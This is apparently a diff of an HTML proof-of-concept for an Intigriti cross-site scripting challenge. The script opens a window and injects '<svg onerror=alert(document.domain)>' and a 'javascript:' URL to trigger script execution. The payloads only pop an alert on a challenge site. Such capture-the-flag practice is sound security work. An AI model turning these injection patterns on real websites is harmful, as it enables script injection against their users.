@@ -13,7 +13,7 @@
     document.body.appendChild(iframe);
   </script>
   <script>
-    var myWindow = window.open('https://challenge.intigriti.io/static/4/challenge.png');
+    var myWindow = window.open('https://challenge.intigriti.io/static/4/challenge.png', 'javascript:alert(document.domain)');
     myWindow.opener.document.write('<svg src=x onerror=alert(document.domain)>')
   </script>
 
